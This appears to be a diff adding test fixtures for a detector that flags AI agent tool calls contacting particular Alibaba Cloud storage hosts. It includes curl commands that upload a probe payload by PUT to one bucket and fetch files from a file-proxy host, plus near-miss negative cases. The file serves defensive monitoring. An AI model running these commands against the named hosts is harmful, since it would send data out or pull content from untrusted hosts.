@@ -1,0 +1,44 @@
+[
+  {
+    "label": "PUT probe to the Beijing bucket",
+    "text": "curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary \"PROBE_PAYLOAD_ABC123\" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "file proxy host",
+    "text": "curl -s https://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/f/1",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "file proxy host as a fetched URL",
+    "text": "https://routify-file-proxy-sg.aliyuncs.com/file?id=1",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "another bucket in the same region",
+    "text": "curl -s https://other-bucket.oss-cn-beijing.aliyuncs.com/a",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "bucket name that only ends the same way",
+    "text": "curl -s https://notsanmaohe.oss-cn-beijing.aliyuncs.com/a",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "unrelated proxy name",
+    "text": "curl -s https://routify-file-proxy.example.com/x",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "host quoted in a tool response",
+    "text": "curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary \"PROBE_PAYLOAD_ABC123\" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin",
+    "shouldMatch": false,
+    "eventKind": "response"
+  }
+]
